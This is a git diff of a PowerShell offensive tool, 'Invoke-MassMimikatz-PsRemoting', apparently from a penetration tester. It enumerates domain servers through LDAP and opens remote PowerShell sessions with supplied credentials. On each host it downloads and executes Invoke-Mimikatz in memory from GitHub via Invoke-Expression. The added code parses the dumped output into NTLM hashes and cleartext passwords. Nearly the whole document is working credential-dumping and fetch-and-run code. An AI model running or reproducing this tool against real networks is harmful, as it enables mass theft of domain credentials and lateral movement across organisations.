@@ -1,13 +1,17 @@
 # Author: Scott Sutherland (@_nullbind), 2015 NetSPI
 # Description:  This can be used to massmimikatz servers with registered winrm SPNs from a non domain system.
-# Example: PS C:\> Get-MimikatzCreds2012 -DomainController dc1.acme.com -Credential acme\user -MaxHost 10
-# Example: PS C:\> Get-MimikatzCreds2012 -DomainController dc1.acme.com -Credential acme\user -MaxHost 10 -OsFilter "2012"
-# Example: PS C:\> Get-MimikatzCreds2012 -DomainController dc1.acme.com -Credential acme\user -MaxHost 10 -PsUrl "https://10.1.1.1/Invoke-Mimikatz.ps1"
-# Example: PS C:\> Get-MimikatzCreds2012 -DomainController dc1.acme.com -Credential acme\user -MaxHost 10 | out-file .\mimikatz-output.txt
+# Invoke-MassMimikatz-PsRemoting -WinRM -OsFilter "2012" -Verbose -DomainController dc.acme.com -Credential acme\user
+# Example: PS C:\> Invoke-MassMimikatz-PsRemoting -DomainController dc1.acme.com -Credential acme\user -MaxHost 10 -verbose
+# Example: PS C:\> Invoke-MassMimikatz-PsRemoting -DomainController dc1.acme.com -Credential acme\user -MaxHost 10 -OsFilter "2012" - verbose
+# Example: PS C:\> Invoke-MassMimikatz-PsRemoting -DomainController dc1.acme.com -Credential acme\user -MaxHost 10 -PsUrl "https://10.1.1.1/Invoke-Mimikatz.ps1" -verbose
+# Example: PS C:\> Invoke-MassMimikatz-PsRemoting -DomainController dc1.acme.com -Credential acme\user -MaxHost 10 | out-file .\mimikatz-output.txt
+# Example: PS C:\> Invoke-MassMimikatz-PsRemoting -DomainController dc1.acme.com -Credential acme\user -MaxHost 10 -DomainController 10.1.1.1 -Credential  -verbose
 # Note: this is based on work done by rob fuller, JosephBialek, carlos perez, benjamin delpy, and will schroeder.
+# note: returns data table object.
+# todo: fix psurl, add host opt from pipeline, add from host from file.
 # Just for fun.
 
-function Get-MimikatzCredsWinRm
+function Invoke-MassMimikatz-PsRemoting
 {
     [CmdletBinding()]
     Param(
@@ -27,6 +31,10 @@ function Get-MimikatzCredsWinRm
         [Parameter(Mandatory=$false,
         HelpMessage="Limit results by the provided operating system. Default is all.")]
         [string]$OsFilter = "*",
+
+        [Parameter(Mandatory=$false,
+        HelpMessage="Limit results by only include servers with registered winrm services.")]
+        [switch]$WinRM,
 
         [Parameter(Mandatory=$false,
         HelpMessage="Set the url to download invoke-mimikatz.ps1 from.  The default is the github repo.")]
@@ -67,11 +75,11 @@ function Get-MimikatzCredsWinRm
         # Get the list of domain computers
         # ----------------------------------------
 
-        Write-verbose "Getting list of Servers with WinRM installed from DC..."
+        Write-verbose "Getting list of Servers from $DomainController..."
 
         # Create data table to house results
-        $TblServers2012 = New-Object System.Data.DataTable 
-        $TblServers2012.Columns.Add("ComputerName") | Out-Null
+        $TblServers = New-Object System.Data.DataTable 
+        $TblServers.Columns.Add("ComputerName") | Out-Null
 
         # Get domain computers from dc 
         if ($OsFilter -eq "*"){
@@ -79,8 +87,15 @@ function Get-MimikatzCredsWinRm
         }else{
             $OsCompFilter = "(operatingsystem=*$OsFilter*)"
         }
-        $CompFilter = "(&(objectCategory=Computer)(servicePrincipalName=*WSMAN*)$OsCompFilter)"
-        
+
+        # Select winrm spns if flagged
+        if($WinRM){
+            $winrmComFilter = "(servicePrincipalName=*WSMAN*)"
+        }else{
+            $winrmComFilter = ""
+        }
+
+        $CompFilter = "(&(objectCategory=Computer)$winrmComFilter $OsCompFilter)"        
         $ObjSearcher.PageSize = $Limit
         $ObjSearcher.Filter = $CompFilter
         $ObjSearcher.SearchScope = "Subtree"
@@ -94,22 +109,153 @@ function Get-MimikatzCredsWinRm
             
             #add server to data table
             $ComputerName = [string]$_.properties.dnshostname
-            $TblServers2012.Rows.Add($ComputerName) | Out-Null 
+            $TblServers.Rows.Add($ComputerName) | Out-Null 
+        }
+
+        # Create data table to house results to return
+        $TblPasswordList = New-Object System.Data.DataTable 
+        $TblPasswordList.Columns.Add("Type") | Out-Null
+        $TblPasswordList.Columns.Add("Domain") | Out-Null
+        $TblPasswordList.Columns.Add("Username") | Out-Null
+        $TblPasswordList.Columns.Add("Password") | Out-Null  
+        $TblPasswordList.Clear()
+
+        # ----------------------------------------
+        # Mimikatz prase function (Will Schoeder's) 
+        # ----------------------------------------        
+        # This is a *very slightly mod version of will schroeder's function from:
+        # https://raw.githubusercontent.com/Veil-Framework/PowerTools/master/PewPewPew/Invoke-MassMimikatz.ps1
+        function Parse-Mimikatz {
+
+            [CmdletBinding()]
+            param(
+                [string]$raw
+            )
+    
+            # Create data table to house results
+            $TblPasswords = New-Object System.Data.DataTable 
+            $TblPasswords.Columns.Add("PwType") | Out-Null
+            $TblPasswords.Columns.Add("Domain") | Out-Null
+            $TblPasswords.Columns.Add("Username") | Out-Null
+            $TblPasswords.Columns.Add("Password") | Out-Null    
+
+            # msv
+	        $results = $raw | Select-String -Pattern "(?s)(?<=msv :).*?(?=tspkg :)" -AllMatches | %{$_.matches} | %{$_.value}
+            if($results){
+                foreach($match in $results){
+                    if($match.Contains("Domain")){
+                        $lines = $match.split("`n")
+                        foreach($line in $lines){
+                            if ($line.Contains("Username")){
+                                $username = $line.split(":")[1].trim()
+                            }
+                            elseif ($line.Contains("Domain")){
+                                $domain = $line.split(":")[1].trim()
+                            }
+                            elseif ($line.Contains("NTLM")){
+                                $password = $line.split(":")[1].trim()
+                            }
+                        }
+                        if ($password -and $($password -ne "(null)")){
+                            #$username+"/"+$domain+":"+$password
+                            $Pwtype = "msv"
+                            $TblPasswords.Rows.Add($Pwtype,$domain,$username,$password) | Out-Null 
+                        }
+                    }
+                }
+            }
+            $results = $raw | Select-String -Pattern "(?s)(?<=tspkg :).*?(?=wdigest :)" -AllMatches | %{$_.matches} | %{$_.value}
+            if($results){
+                foreach($match in $results){
+                    if($match.Contains("Domain")){
+                        $lines = $match.split("`n")
+                        foreach($line in $lines){
+                            if ($line.Contains("Username")){
+                                $username = $line.split(":")[1].trim()
+                            }
+                            elseif ($line.Contains("Domain")){
+                                $domain = $line.split(":")[1].trim()
+                            }
+                            elseif ($line.Contains("Password")){
+                                $password = $line.split(":")[1].trim()
+                            }
+                        }
+                        if ($password -and $($password -ne "(null)")){
+                            #$username+"/"+$domain+":"+$password
+                            $Pwtype = "wdigest/tspkg"
+                            $TblPasswords.Rows.Add($Pwtype,$domain,$username,$password) | Out-Null
+                        }
+                    }
+                }
+            }
+            $results = $raw | Select-String -Pattern "(?s)(?<=wdigest :).*?(?=kerberos :)" -AllMatches | %{$_.matches} | %{$_.value}
+            if($results){
+                foreach($match in $results){
+                    if($match.Contains("Domain")){
+                        $lines = $match.split("`n")
+                        foreach($line in $lines){
+                            if ($line.Contains("Username")){
+                                $username = $line.split(":")[1].trim()
+                            }
+                            elseif ($line.Contains("Domain")){
+                                $domain = $line.split(":")[1].trim()
+                            }
+                            elseif ($line.Contains("Password")){
+                                $password = $line.split(":")[1].trim()
+                            }
+                        }
+                        if ($password -and $($password -ne "(null)")){
+                            #$username+"/"+$domain+":"+$password
+                            $Pwtype = "wdigest/kerberos"
+                            $TblPasswords.Rows.Add($Pwtype,$domain,$username,$password) | Out-Null
+                        }
+                    }
+                }
+            }
+            $results = $raw | Select-String -Pattern "(?s)(?<=kerberos :).*?(?=ssp :)" -AllMatches | %{$_.matches} | %{$_.value}
+            if($results){
+                foreach($match in $results){
+                    if($match.Contains("Domain")){
+                        $lines = $match.split("`n")
+                        foreach($line in $lines){
+                            if ($line.Contains("Username")){
+                                $username = $line.split(":")[1].trim()
+                            }
+                            elseif ($line.Contains("Domain")){
+                                $domain = $line.split(":")[1].trim()
+                            }
+                            elseif ($line.Contains("Password")){
+                                $password = $line.split(":")[1].trim()
+                            }
+                        }
+                        if ($password -and $($password -ne "(null)")){
+                            #$username+"/"+$domain+":"+$password
+                            $Pwtype = "kerberos/ssp"
+                            $TblPasswords.Rows.Add($PWtype,$domain,$username,$password) | Out-Null
+                        }
+                    }
+                }
+            }
+
+            # Remove the computer accounts
+            $TblPasswords_Clean = $TblPasswords | Where-Object { $_.username -notlike "*$"}
+
+            return $TblPasswords_Clean
         }
 
 
         # ----------------------------------------
         # Establish sessions
         # ---------------------------------------- 
-        $ServerCount = $TblServers2012.Rows.Count
-        Write-Verbose "Found $ServerCount 2012 Servers."
+        $ServerCount = $TblServers.Rows.Count
+        Write-Verbose "Found $ServerCount servers that met search criteria."
         Write-verbose "Attempting to create $MaxHosts ps sessions..."
 
         # Set counters
         $Counter = 0     
         $SessionCount = 0   
 
-        $TblServers2012 | 
+        $TblServers | 
         ForEach-Object {
 
             if ($Counter -le $ServerCount -and $SessionCount -lt $MaxHosts){
@@ -120,28 +266,42 @@ function Get-MimikatzCredsWinRm
 
                 # attempt session
                 [string]$MyComputer = $_.ComputerName    
-                Write-Verbose "Established Sessions: $SessionCount of $MaxHosts - Processing server $Counter of $ServerCount"         
-                New-PSSession -ComputerName $MyComputer -Credential $Credential -ErrorAction SilentlyContinue            
+                Write-Verbose "Established Sessions: $SessionCount of $MaxHosts - Processing server $Counter of $ServerCount - $MyComputer"         
+                New-PSSession -ComputerName $MyComputer -Credential $Credential -ErrorAction SilentlyContinue | Out-Null          
             }
         }                   
 
-        # ----------------------------------------
-        # Attempt to run mimikatz
-        # ---------------------------------------- 
+
+        # ---------------------------------------------
+        # Attempt to run mimikatz against open sessions
+        # ---------------------------------------------
         if($SessionCount -ge 1){
 
             # run the mimikatz command
             Write-verbose "Running reflected Mimikatz against $SessionCount open ps sessions..."
             $x = Get-PSSession
-            Invoke-Command -Session $x -ScriptBlock {Invoke-Expression (new-object System.Net.WebClient).DownloadString("$PsUrl");invoke-mimikatz}
+            [string]$MimikatzOutput = Invoke-Command -Session $x -ScriptBlock {Invoke-Expression (new-object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1");invoke-mimikatz -ErrorAction SilentlyContinue} -ErrorAction SilentlyContinue           
+            $TblResults = Parse-Mimikatz -raw $MimikatzOutput
+            $TblResults | foreach {
+            
+                [string]$pwtype = $_.pwtype
+                [string]$pwdomain = $_.domain
+                [string]$pwusername = $_.username
+                [string]$pwpassword = $_.password
+                $TblPasswordList.Rows.Add($PWtype,$pwdomain,$pwusername,$pwpassword) | Out-Null
+            }
+            
 
             # remove sessions
             Write-verbose "Removing ps sessions..."
-            Disconnect-PSSession -Session $x
-            Remove-PSSession -Session $x
+            Disconnect-PSSession -Session $x | Out-Null
+            Remove-PSSession -Session $x | Out-Null
 
             # Clear datatable
-            $TblServers2012.Clear()
+            $TblServers.Clear()
+            
+            # Return passwords
+            $TblPasswordList | select type,domain,username,password -Unique | Sort-Object domain,username,password
         
         }else{
             Write-verbose "No ps sessions could be created."
